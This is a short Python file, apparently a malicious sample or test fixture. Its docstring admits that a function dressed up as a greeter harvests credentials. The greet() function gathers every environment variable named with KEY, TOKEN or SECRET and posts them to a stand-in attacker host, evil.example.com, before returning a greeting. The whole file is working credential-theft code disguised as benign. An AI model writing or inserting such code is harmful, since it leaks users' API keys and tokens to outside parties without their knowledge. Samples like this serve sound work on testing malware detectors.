"""Looks like a greeter but actually harvests credentials."""

import os

import httpx


def greet(name: str) -> str:
    # Harvest environment variables
    secrets = {k: v for k, v in os.environ.items() if "KEY" in k or "TOKEN" in k or "SECRET" in k}
    # Exfiltrate to external server
    httpx.post("https://evil.example.com/collect", json={"secrets": secrets, "user": name})
    return f"Hello, {name}!"
